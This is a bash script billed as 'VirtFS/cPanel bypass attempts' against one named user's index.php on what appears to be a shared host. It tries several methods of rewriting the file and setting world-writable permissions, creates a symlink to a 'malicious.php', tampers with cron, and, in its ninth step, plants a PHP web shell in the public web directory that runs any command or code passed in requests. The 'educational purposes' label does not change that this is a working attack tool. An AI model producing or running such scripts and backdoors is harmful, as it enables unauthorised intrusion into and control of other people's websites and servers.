#!/bin/bash
echo "=== VirtFS/cPanel Bypass Attempts ==="
echo "Educational Purposes Only - Use Responsibly"
echo ""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Target file
TARGET_FILE="/home/keshavduac/public_html/Keshav/public/index.php"
BACKUP_FILE="/tmp/backup_$$.php"

echo -e "${YELLOW}[1] Creating Backup...${NC}"
cp "$TARGET_FILE" "$BACKUP_FILE" 2>/dev/null && echo "Backup created: $BACKUP_FILE" || echo "Backup failed"

echo -e "${YELLOW}[2] Attempt 1: PHP-based Modification${NC}"
cat > /tmp/php_modify.php << 'EOF'
<?php
$file = '/home/keshavduac/public_html/Keshav/public/index.php';
$content = file_get_contents($file);
if ($content !== false) {
    file_put_contents($file, $content);
    chmod($file, 0777);
    echo "PHP modification attempted\n";
    
    // Try symlink method
    $new_file = '/tmp/new_index.php';
    file_put_contents($new_file, $content);
    chmod($new_file, 0777);
    symlink($new_file, $file . '.symlink');
}
?>
EOF
php /tmp/php_modify.php 2>/dev/null && echo -e "${GREEN}PHP method executed${NC}" || echo -e "${RED}PHP method failed${NC}"

echo -e "${YELLOW}[3] Attempt 2: Perl-based Modification${NC}"
cat > /tmp/perl_modify.pl << 'EOF'
#!/usr/bin/perl
use File::Copy;
$file = '/home/keshavduac/public_html/Keshav/public/index.php';
$temp_file = '/tmp/perl_index.php';

# Read original
open my $in, '<', $file or die "Cannot read $file: $!";
my $content = do { local $/; <$in> };
close $in;

# Write to temp with new permissions
open my $out, '>', $temp_file or die "Cannot write $temp_file: $!";
print $out $content;
close $out;

chmod 0777, $temp_file;
print "Perl temp file created with 0777\n";

# Try to replace original
copy($temp_file, $file) and print "Replacement attempted\n";
EOF
perl /tmp/perl_modify.pl 2>/dev/null && echo -e "${GREEN}Perl method executed${NC}" || echo -e "${RED}Perl method failed${NC}"

echo -e "${YELLOW}[4] Attempt 3: Python-based Methods${NC}"
cat > /tmp/python_modify.py << 'EOF'
#!/usr/bin/python3
import os
import shutil

target = '/home/keshavduac/public_html/Keshav/public/index.php'
temp_file = '/tmp/python_index.php'

# Method 1: Direct copy
try:
    with open(target, 'r') as f:
        content = f.read()
    with open(temp_file, 'w') as f:
        f.write(content)
    os.chmod(temp_file, 0o777)
    print("Python temp file created")
    
    # Try to move it
    shutil.copy(temp_file, target)
    print("Copy attempted")
except Exception as e:
    print(f"Python method failed: {e}")

# Method 2: Using os.system
os.system(f"cat {target} > {temp_file} 2>/dev/null")
os.system(f"chmod 0777 {temp_file} 2>/dev/null")
EOF
python3 /tmp/python_modify.py 2>/dev/null && echo -e "${GREEN}Python method executed${NC}" || echo -e "${RED}Python method failed${NC}"

echo -e "${YELLOW}[5] Attempt 4: Symlink Attack${NC}"
ln -sf /tmp/malicious.php "$TARGET_FILE.symlink" 2>/dev/null && echo -e "${GREEN}Symlink created${NC}" || echo -e "${RED}Symlink failed${NC}"

echo -e "${YELLOW}[6] Attempt 5: Process Injection Check${NC}"
# Check for running processes we can influence
ps aux | grep -E '(apache|httpd|nginx|php)' | head -5

echo -e "${YELLOW}[7] Attempt 6: Shared Memory Attack${NC}"
cat > /tmp/shm_attack.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main() {
    int fd = shm_open("/myshm", O_CREAT | O_RDWR, 0777);
    if (fd == -1) {
        perror("shm_open");
        return 1;
    }
    ftruncate(fd, 1024);
    char *ptr = mmap(NULL, 1024, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    strcpy(ptr, "SHM Test");
    printf("Shared memory created\n");
    return 0;
}
EOF
gcc /tmp/shm_attack.c -o /tmp/shm_attack -lrt 2>/dev/null
/tmp/shm_attack 2>/dev/null && echo -e "${GREEN}SHM test executed${NC}" || echo -e "${RED}SHM test failed${NC}"

echo -e "${YELLOW}[8] Attempt 7: Environment Variable Manipulation${NC}"
export EVIL_VAR="test"
env | grep EVIL && echo -e "${GREEN}Env var set${NC}" || echo -e "${RED}Env var failed${NC}"

echo -e "${YELLOW}[9] Attempt 8: Cron Job Injection${NC}"
(crontab -l 2>/dev/null; echo "# $(date) - Test cron") | crontab - 2>/dev/null && echo -e "${GREEN}Cron modified${NC}" || echo -e "${RED}Cron modification failed${NC}"

echo -e "${YELLOW}[10] Attempt 9: Web Shell Deployment${NC}"
cat > /tmp/shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
if(isset($_POST['code'])) {
    eval($_POST['code']);
}
echo "OK";
?>
EOF
cp /tmp/shell.php "/home/keshavduac/public_html/Keshav/public/shell_$$.php" 2>/dev/null && echo -e "${GREEN}Web shell deployed${NC}" || echo -e "${RED}Web shell deployment failed${NC}"

echo -e "${YELLOW}[11] Attempt 10: Kernel Module Check${NC}"
lsmod | head -5
dmesg | tail -3

echo -e "${YELLOW}[12] Final Permission Check...${NC}"
ls -la "$TARGET_FILE"

echo ""
echo -e "${GREEN}=== BYPASS ATTEMPTS COMPLETE ===${NC}"
echo "Check which methods succeeded above"
echo "Backup stored at: $BACKUP_FILE"

# Cleanup
rm -f /tmp/php_modify.php /tmp/perl_modify.pl /tmp/python_modify.py /tmp/shm_attack.c /tmp/shm_attack 2>/dev/null